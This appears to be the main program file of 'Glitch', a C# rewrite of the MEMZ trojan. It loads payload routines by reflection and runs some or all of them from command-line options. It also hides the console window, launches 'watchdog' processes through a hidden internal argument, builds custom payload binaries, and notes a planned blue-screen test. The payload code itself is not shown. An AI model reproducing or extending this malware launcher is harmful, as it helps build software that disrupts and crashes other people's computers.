#define Watch_Dogs

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using GlitchPayloads;
using Misc;

namespace Glitch
{
    public class Program
    {
        public static List<Tuple<MethodInfo, PayloadAttribute>>? payloads;

        public static void Main(string[] args)
        {
#if Watch_Dogs
            if (args.Length == 1 && args[0] == "wd")
            {
                WatchDog.Run();
                return;
            }
#endif
            args = args == null || args.Length == 0
                ? new[] {"form"}
                : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
            payloads = Assembly.GetAssembly(typeof(PayloadClassAttribute)).GetTypes()
                .Where(s => s.IsClass &&
                            s.GetCustomAttributes(false).Any(a => a is PayloadClassAttribute))
                .SelectMany(s => s.GetMethods()).Where(s =>
                    !s.GetParameters().Any(q => true) && s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
                .OrderBy(s => s.GetPayloadName())
                .Select(s => new Tuple<MethodInfo, PayloadAttribute>(s,
                    (PayloadAttribute) s.GetCustomAttributes(false).First(a => a is PayloadAttribute))).ToList();
            switch (args[0])
            {
                case "form":
                    Common.TimePassed = float.PositiveInfinity;
                    Common.DelayMultiplier = 0.25f;
                    Application.Run(new RunGUI());
                    break;
                case "list":
                    Console.WriteLine(
                        string.Join(Environment.NewLine, payloads.Select(s => s.Item1.GetPayloadName())));
                    Console.WriteLine(
                        "[run] also accepts \"wd\", indicating watchdogs should be used, \"np\" for showing the notepad prompt," +
                        Environment.NewLine + "\"hd\" for hiding the command prompt and \"sd\" to skip delays");
                    break;
                case "full":
                    StandardCommands.ShowNotepad();
                    payloads.ForEach(s => LaunchRunner(s.Item1, s.Item2));
                    StandardCommands.LaunchIncrementor();
#if Watch_Dogs
                    StandardCommands.HideCmd();
                    StandardCommands.RunWDs();
#else
                    ShowKill();
#endif
                    break;
                case "run":
                    if (args.Contains("np"))
                        StandardCommands.ShowNotepad();
                    Console.WriteLine("Using payloads:");
                    payloads.Where(s => args.Skip(1).Any(a => s.Item1.GetPayloadName().ToLower() == a)).ToList()
                        .ForEach(
                            s =>
                            {
                                Console.WriteLine($"- {s.Item1.GetPayloadName()}");
                                LaunchRunner(s.Item1, s.Item2);
                                StandardCommands.GetRunner(s.Item1, args.Contains("sd") ? 0 : s.Item2.RunAfter,
                                    s.Item2.DefaultDelay);
                            });
                    StandardCommands.LaunchIncrementor();
                    if (args.Contains("hd"))
                        StandardCommands.HideCmd();
                    if (args.Contains("wd"))
                        StandardCommands.RunWDs();
                    ShowKill();
                    break;
                case "bld":
                    PayloadBundleBuilder.Build(args.Skip(1).ToArray());
                    break;
                case "help":
                    ShowHelp();
                    break;
                default:
                    Console.WriteLine("Invalid operator");
                    ShowHelp();
                    break;
            }
        }

        private static void ShowKill()
        {
            Console.WriteLine("Press [ENTER] to kill");
            Console.ReadLine();
            Environment.Exit(0);
        }

        public static void ShowHelp()
        {
            Console.WriteLine("CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#"
#if DEBUG
                              + " - DEBUG BUILD"
#endif
            );
            Console.WriteLine("Usage: Glitch <command> [parameters]");
            Console.WriteLine("");
            Console.WriteLine("Commands:");
            Console.WriteLine("-   form: Shows a GUI to customize payloads (Memz Clean). Default.");
            Console.WriteLine("-   help: Displays this message");
            Console.WriteLine("-   list: Lists all payloads");
            Console.WriteLine("-   run:  Run only the payloads specified in parameters. See \"list\" for details");
            Console.WriteLine("-   bld:  Build your own specialized binary. Same rules as \"run\"");
#if Watch_Dogs
            Console.WriteLine("-   full: Runs all payloads. Includes Watchdogs");
#else
            Console.WriteLine("-   full: Runs all payloads");
#endif
#if Watch_Dogs
            Console.WriteLine("-   wd:   This is used internally and should never be used from outside");
#endif
        }

        public static void LaunchRunner(MethodInfo method, PayloadAttribute data) =>
            StandardCommands.GetRunner(method, data.RunAfter, data.DefaultDelay).Start();
    }
}

//TODO: Test BSOD